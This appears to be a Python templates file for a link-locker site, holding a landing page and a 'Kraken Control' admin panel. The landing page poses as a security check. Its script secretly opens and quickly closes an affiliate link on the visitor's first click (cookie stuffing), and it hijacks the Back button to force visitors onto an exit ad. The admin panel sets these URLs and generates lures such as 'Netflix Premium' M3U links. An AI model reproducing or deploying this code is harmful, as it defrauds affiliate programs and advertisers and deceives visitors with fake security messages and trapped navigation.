# templates.py

# --- 1. User Landing Page (White/Blue Theme) ---
LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resource Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style> 
        body { font-family: 'Inter', sans-serif; background: #ffffff; scroll-behavior: smooth; }
        .progress-bar { width: 0%; transition: width 0.5s ease-out; }
    </style>
</head>
<body class="text-slate-800">
    <div class="max-w-xl mx-auto pt-12 px-6">
        <div class="bg-white rounded-[2.5rem] p-10 shadow-xl shadow-blue-100/40 border border-blue-50 text-center mb-10">
            <div class="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6 text-2xl shadow-inner">🛡️</div>
            <h1 class="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Security Handshake</h1>
            <p class="text-slate-400 text-sm mb-8" id="header_msg">Validating your secure connection...</p>
            <div id="timer_area" class="bg-slate-50 p-8 rounded-[2rem] border border-slate-100">
                <div class="w-full bg-slate-200 h-1 rounded-full overflow-hidden mb-3">
                    <div id="bar" class="progress-bar h-full bg-blue-500 shadow-[0_0_10px_rgba(59,130,246,0.5)]"></div>
                </div>
                <p id="timer_text" class="text-[10px] font-bold text-blue-500 uppercase tracking-widest">Preparing Link: 15s</p>
            </div>
        </div>
        <div class="pb-32 px-2">
            <h2 class="text-xl font-black text-slate-800 mb-6 tracking-tight">{{ article.title }}</h2>
            <div class="text-slate-500 leading-relaxed text-sm space-y-6">
                <p>{{ article.body }}</p>
                <div class="h-48 bg-slate-50 rounded-[2.5rem] border border-dashed border-slate-200 flex items-center justify-center text-slate-300 text-[10px] uppercase tracking-widest italic text-center px-4">
                    Handshake Encryption Tunnel Active
                </div>
                <p>To finalize the security handshake and unlock your link, please scroll to the bottom. Automated access is strictly prohibited.</p>
            </div>
        </div>
        <div class="fixed bottom-0 left-0 w-full p-6 bg-gradient-to-t from-white via-white to-transparent">
            <div id="instruction" class="max-w-md mx-auto text-center p-4 bg-blue-50 text-blue-600 rounded-2xl text-[10px] font-bold uppercase mb-4 hidden animate-bounce">⬇️ Scroll down to unlock link</div>
            <div id="final_area" class="max-w-md mx-auto hidden">
                <a href="/redirect?url={{ target_url|urlencode }}&type=organic" class="block w-full bg-blue-600 hover:bg-blue-700 text-white py-5 rounded-[1.5rem] font-bold text-center shadow-2xl shadow-blue-200 transition-all active:scale-95">Access Link Now</a>
            </div>
        </div>
    </div>
    <script>
        let timeLeft = 15; let isTimeUp = false; let isScrolled = false; let isInjected = false;
        const s_url = "/redirect?url=" + encodeURIComponent("{{ s.stuffing_url }}");
        const e_url = "/redirect?url=" + encodeURIComponent("{{ s.exit_url }}");

        function triggerInject() {
            if(!isInjected && "{{ s.stuffing_url }}") {
                const pop = window.open(s_url, '_blank');
                if(pop) { window.focus(); setTimeout(() => { try{pop.close();}catch(e){} }, 2000); }
                isInjected = true;
            }
        }
        document.addEventListener('touchstart', triggerInject, {once:true});
        document.addEventListener('click', triggerInject, {once:true});

        const iv = setInterval(() => {
            timeLeft--;
            document.getElementById('bar').style.width = ((15-timeLeft)/15)*100 + "%";
            document.getElementById('timer_text').innerText = "Preparing Link: " + timeLeft + "s";
            if(timeLeft <= 0) {
                clearInterval(iv); isTimeUp = true;
                document.getElementById('timer_area').style.opacity = "0.4";
                document.getElementById('instruction').classList.remove('hidden');
                check();
            }
        }, 1000);

        window.onscroll = () => {
            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 150) {
                isScrolled = true; check();
            }
        };

        function check() {
            if(isTimeUp && isScrolled) {
                document.getElementById('instruction').classList.add('hidden');
                document.getElementById('final_area').classList.remove('hidden');
                document.getElementById('header_msg').innerText = "Handshake Successful.";
            }
        }

        (function() {
            if(!e_url) return;
            for(let i=0; i<3; i++) history.pushState(null, null, location.href);
            window.onpopstate = () => { location.href = "/redirect?url=" + encodeURIComponent(e_url) + "&type=back"; };
        })();
    </script>
</body>
</html>
"""

# --- 2. Admin Dashboard (The Control Room) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Master Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; background: #f8fafc; } </style>
</head>
<body class="p-4 text-slate-800">
    <div class="max-w-xl mx-auto">
        <header class="bg-white p-6 rounded-[2rem] shadow-sm border border-slate-100 mb-6 flex justify-between items-center">
            <h1 class="text-xl font-black text-blue-600 tracking-tighter uppercase">Kraken Control</h1>
            <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100">STABLE</span>
        </header>

        <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-6">
            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-6">Monetization Engine</h2>
            <form action="/admin/update_settings" method="POST" class="space-y-4">
                <input name="stuffing_url" value="{{ s.stuffing_url }}" placeholder="AliExpress Product Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs font-mono">
                <input name="exit_url" value="{{ s.exit_url }}" placeholder="Exit Ad Link (Tonic/Adsterra)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs font-mono">
                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest active:scale-95 transition">Update All Nodes</button>
            </form>
        </div>

        <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-8">
            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-6">Link Factory</h2>
            <form action="/admin/create_link" method="POST" class="space-y-4">
                <input name="title" placeholder="Asset Name (e.g. Netflix Premium)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs" required>
                <input name="target_url" placeholder="Final M3U/Download Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs" required>
                <button class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-blue-100 active:scale-95 transition">Generate Link</button>
            </form>
        </div>

        <div class="space-y-4 pb-20">
            {% for link in links %}
            <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border border-slate-100">
                <div class="flex justify-between items-center mb-4">
                    <div>
                        <span class="font-black text-slate-800 text-sm">{{ link.title }}</span>
                        <span class="block text-[9px] text-blue-500 font-bold mt-1 uppercase">Clicks: {{ link.clicks }}</span>
                    </div>
                    <a href="/admin/delete/{{ link._id }}" class="text-red-300 hover:text-red-500">🗑️</a>
                </div>
                <div class="flex gap-2">
                    <input id="u_{{ link._id }}" value="{{ host_url }}v/{{ link.slug }}" class="flex-1 p-3 bg-slate-50 border border-slate-100 rounded-xl text-[9px] font-mono outline-none" readonly>
                    <button onclick="copy('u_{{ link._id }}')" class="bg-blue-600 text-white px-5 rounded-xl text-[10px] font-bold">COPY</button>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>
    <script>
        function copy(id) {
            var c = document.getElementById(id); c.select(); document.execCommand("copy");
            alert("Link copied!");
        }
    </script>
</body>
</html>
"""
